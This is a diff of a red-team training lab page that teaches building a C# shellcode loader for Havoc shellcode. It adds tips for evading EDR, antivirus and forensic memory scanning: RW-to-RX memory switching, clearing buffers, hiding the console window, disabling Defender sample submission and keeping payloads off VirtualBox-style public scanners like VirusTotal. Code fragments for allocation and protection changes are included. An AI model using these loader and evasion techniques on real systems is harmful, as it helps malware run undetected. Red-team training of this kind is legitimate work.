@@ -1,6 +1,13 @@
 # Lab - Basic Loader
+<style>
+r { color: Red }
+o { color: Orange }
+g { color: Green }
+</style>
 
-> ***IMPORTANT***: Do not submit any of the training's code to VirusTotal!!!
+> ***IMPORTANT*** : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
+> **Make sure at all times that sample submussion in Microsoft Defender is `turned off`, and if for some reason you get prompted to submit a sample, deny the request.**
+
 
 > When building a shellcode loader, you can use any coding language, c, c++, c#, powershell, rust, golang and so on. In general, detection rates for languages like golang, rust and nim are lower, they are much harder to analyze and reverse than standard c or c# code. In this training we''l be using C as our language, as it is a low level programming language (no CLR that does JIT compiling like with C# or powershell), remember most windows API functions are written in C/C++ as well.
 
@@ -28,6 +35,14 @@
 ### Control Over System Resources:
 - Fine-grained memory management (e.g., `malloc`, `free`) for optimization.
 - Direct use of Windows threading and synchronization APIs for efficient multitasking.
+
+
+To build our own shellcode loader we need 4 functions:
+
+> VirtualAlloc (Kernel32.dll)
+> CreateRemoteThread (Kernel32.dll)
+> MarshallCopy
+> WaitForSingleObject (Kernel32.dll)
 
 Generate havoc shellcode/helloworld dialog
 
@@ -166,15 +181,64 @@ namespace ShellcodePayload
         {
             0x56,0x48,0x89,0xe6,...
         };
-        }
     }
 }
 ```
 
-To build our own shellcode loader we need 4 functions:
+> OPSEC TIP : Clear out the shellcode buffer after injecting it into memory (this becomes more revelevant when we encrypt/obfuscate our shellcode) to evade memory scanning.
 
-VirtualAlloc (Kernel32.dll)
-CreateRemoteThread (Kernel32.dll)
-MarshallCopy
-WaitForSingleObject (Kernel32.dll)
+```csharp
+Array.Clear(buf, 0, buf.Length);
+```
+
+> OPSEC TIP : Remove comments from your code, and avoid using variables like "buf" and "shellcode".
+
+> OPSEC TIP: ***DON'T use RWX permissions***, split them up in RW and RX
+> the RW-to-RX approach enhances security by ensuring the memory is only executable when necessary. Extend the code to integrate with DNS-based key retrieval or other loader logic, ensuring all operations are performed securely. For example, after retrieving the XOR key, allocate memory as RW, write the decrypted shellcode, change to RX, and execute, minimizing exposure.
+>
+> WHY? assignung RWX to a dynamically allocated memory basically scream "HEY I'M DOING SOMETHING REALLY WEIRD!" - EDR's will typically flag this and once a `thread` is created to the address of this memory space (= start the code in the memory region), they'll initiate a memory scan on the contents of that memory region - or simply just kill the process immediately. Also forensic analysts will flag this immediately and quite a lot om memory analysis tools (i.e. volatility) likewise will flag on this.
+
+Below you can see when we run our basic loader that ge can run a simple powershell tools that scans all running processes for RWX permissions that have a createthread associated with them:
+
+```powershell
+.\get-injectedThread.ps1
+```
+
+![Screenshot](./images/lab_basic_rwx.jpg)
+
+```csharp
+UInt32 PAGE_READWRITE = 0x04;
+IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_READWRITE);
+```
+
+and
+
+```csharp
+UInt32 PAGE_EXECUTE_READ = 0x20;
+UInt32 oldProtect;
+bool protectResult = VirtualProtect(funcAddr, (UInt32)shellCode.Length, PAGE_EXECUTE_READ, out oldProtect);
+if (!protectResult)
+{
+    Console.WriteLine("Failed to change memory protection.");
+    return;
+}
+```
+
+> HIDE the console window
+>
+```CSharp
+[DllImport("user32.dll")]
+private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+[DllImport("kernel32.dll")]
+private static extern IntPtr GetConsoleWindow();
+const int SW_HIDE = 0;
+
+var handle = GetConsoleWindow();
+ShowWindow(handle, SW_HIDE);
+```
+
+# MODULARITY
+> In order to keep our shellcode loader neatly organized we'll make it modular - so instead of just adding code to the main program - let's put our functions in seperate classes (.cs files) that we can simply call from main. This will allow us to keep adding functionality while keeping an oversight of where we are and what we're. doing
+
 
